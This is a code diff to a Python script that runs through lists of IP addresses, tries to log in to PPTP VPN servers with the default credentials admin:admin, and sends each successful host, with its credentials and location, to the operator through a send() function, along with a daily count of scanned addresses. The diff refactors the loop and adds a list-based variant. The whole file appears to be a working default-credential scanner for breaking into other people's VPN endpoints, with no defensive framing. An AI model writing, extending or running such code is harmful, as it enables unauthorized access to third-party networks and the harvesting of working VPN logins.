@@ -50,15 +50,15 @@ def pptp(ip, log, pas):
 
 
 def process_pptp_file(filename):
-    kyiv_tz = pytz.timezone("Europe/Kyiv")
-    now = datetime.now(kyiv_tz)
-
-    if now.hour == 12 and now.minute == 0:
-        count = get_count_checked()
-        send(f"Вообщем проверено {count} IP-адресов")
-
     pptps = open(filename).read().split("\n")
     for ips in list(pptps):
+        kyiv_tz = pytz.timezone("Europe/Kyiv")
+        now = datetime.now(kyiv_tz)
+
+        if now.hour == 12 and now.minute == 0:
+            count = get_count_checked()
+            send(f"Вообщем проверено {count} IP-адресов")
+
         try:
             iss = pptp(ips, "admin", "admin")
             text = f"{iss[0]} - pptp\nLogPass={iss[1]}:{iss[2]}\nState:{ipif(iss[0])[0]}/{ipif(iss[0])[2]}"
@@ -69,6 +69,28 @@ def process_pptp_file(filename):
             add_checked(ips)
             pskl()
             print(f"proxy: {ips} - isn't work")
+            continue
+
+
+def process_pptp_list(ip_list):
+    for ip in list(ip_list):
+        kyiv_tz = pytz.timezone("Europe/Kyiv")
+        now = datetime.now(kyiv_tz)
+
+        if now.hour == 12 and now.minute == 0:
+            count = get_count_checked()
+            send(f"Вообщем проверено {count} IP-адресов")
+
+        try:
+            iss = pptp(ip, "admin", "admin")
+            text = f"{iss[0]} - pptp\nLogPass={iss[1]}:{iss[2]}\nState:{ipif(iss[0])[0]}/{ipif(iss[0])[2]}"
+            send(text)
+            print(f"proxy: {ip} - is work")
+            pskl()
+        except:
+            add_checked(ip)
+            pskl()
+            print(f"proxy: {ip} - isn't work")
             continue
 
 
